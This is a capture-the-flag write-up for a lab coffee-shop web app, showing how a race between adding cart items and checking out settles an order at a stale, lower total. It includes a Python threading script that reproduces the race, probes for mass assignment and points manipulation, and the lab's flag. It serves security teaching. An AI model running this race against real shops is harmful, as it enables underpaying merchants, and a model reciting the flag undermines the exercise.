# cafeclub-005 - BugForge Lab Writeup

**URL:** https://lab-1784440801892-e7l8u7.labs-app.bugforge.io/
**Difficulty:** Easy
**Vulnerability:** Race Condition (TOCTOU) on checkout - cart total computed from a stale read
**Flag:** `bug{0hmLD2lvajZhVl0kQV7HRMXklsmqLmiC}`

---

## Summary

CafeClub is a React SPA plus Express.js coffee shop app with a loyalty points, cart, and checkout flow. `POST /api/checkout` reads the cart to compute the charged total and reads the cart again to build and complete the order, with no locking or transaction isolation between the two reads. Firing a checkout request and an "add item to cart" request concurrently lets the race land such that the order settles at the smaller, pre-race total while the app still finalizes as a completed order, triggering a bonus flow that returns a `promotional_code` field containing the flag.

## Tech Stack

React SPA (CRA, source maps exposed), Express.js (`x-powered-by: Express`), JWT auth (`Authorization: Bearer`), SQLite-backed cart, orders, and loyalty points system.

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` / `POST /api/login` | none | Returns JWT and user object |
| `GET /api/profile` / `PUT /api/profile` | Bearer | `role` and `points` fields are stripped server side on PUT |
| `GET /api/cart` / `POST /api/cart` / `PUT /api/cart/:productId` / `DELETE /api/cart/:productId` | Bearer | Standard cart CRUD |
| `POST /api/checkout` | Bearer | Body: `points_to_use`, `use_gift_card`, card fields |
| `GET/POST /api/giftcards`, `/api/giftcards/purchase`, `/api/giftcards/redeem` | Bearer | Not the vuln path in this build |

## Attack Chain

1. Registered a normal account (`POST /api/register`) and obtained a JWT.
2. Tested `PUT /api/profile` mass assignment by sending `role: "admin"` and `points: 99999` in the body. Server strips both fields on write, so this path is closed.
3. Tested `POST /api/checkout` with `points_to_use: -100000` and with `points_to_use` far exceeding the account balance. Both are correctly rejected with 400 errors, so the points manipulation path is closed too.
4. Pulled the CRA source map (`/static/js/main.*.js.map`) and reviewed `Checkout.js` and `Cart.js`. The checkout request body only carries `points_to_use`, `use_gift_card`, and payment fields, never a client supplied item list or total, meaning pricing and item selection are always derived server side from the live cart.
5. Since the server recomputes everything from the cart on every request, the natural place to look next is whether that recomputation is atomic. Tested a race condition: reset the cart to a single cheap item (Coffee Filters, 8.99 euro), then fired two requests concurrently using Python `threading`:
   - Thread A: `POST /api/cart` adding 5x Coffee Grinder (89.99 euro each)
   - Thread B: `POST /api/checkout` with `points_to_use: 0`
6. Looped the race 15 times. Results were bimodal: most attempts settled at `total: 458.94` (grinder included, race lost), but several attempts settled at `total: 8.99` (grinder excluded from pricing), one of which returned:
   ```json
   {"message":"Order placed successfully","order_id":5,"total":8.99, ...,
    "promotional_code":"bug{0hmLD2lvajZhVl0kQV7HRMXklsmqLmiC}"}
   ```
7. Flag retrieved directly in the checkout response body.

### Reproduction script (core loop)

```python
import requests, threading

def add_expensive():
    s.post(f"{TARGET}/api/cart", json={"product_id": 10, "quantity": 5})

def checkout():
    s.post(f"{TARGET}/api/checkout", json={
        "points_to_use": 0, "use_gift_card": False,
        "card_number": "4444 4444 4444 4444", "card_expiry": "12/25", "card_cvc": "123"
    })

for attempt in range(15):
    reset_cart()  # clear cart, re-add 1x cheap item (id 14)
    t1 = threading.Thread(target=add_expensive)
    t2 = threading.Thread(target=checkout)
    t1.start(); t2.start(); t1.join(); t2.join()
```

## Dead Ends

| Attempted | Result | Lesson |
|---|---|---|
| `PUT /api/profile` with `role: "admin"`, `points: 99999` | Fields silently stripped, no change | Profile mass assignment closed in this build |
| `POST /api/checkout` with `points_to_use: -100000` | 400 "Points to use cannot be negative" | Negative points path closed |
| `POST /api/checkout` with `points_to_use: 99999` on a zero balance | 400 "Insufficient points" | Balance check enforced |
| `GET /api/orders`, `GET /api/orders/:id` | 404 page not found | Order detail routes not enabled in this build, not needed once the flag appeared in the checkout response |

## Root Causes

- Checkout total calculation and order or cart finalization are not wrapped in a single atomic transaction, or protected by a row level lock, on the cart table. This allows a concurrent cart mutation request to interleave between the price computation read and the order completion read.
- No idempotency or versioning check (such as a cart ETag or `updated_at` comparison) exists on checkout to detect that the cart changed since the total was computed.

## CWE / OWASP

CWE-362 (Race Condition / TOCTOU), maps to OWASP API4:2023 (Unrestricted Resource Consumption) and the business logic race condition class under OWASP Top 10 A04 (Insecure Design).
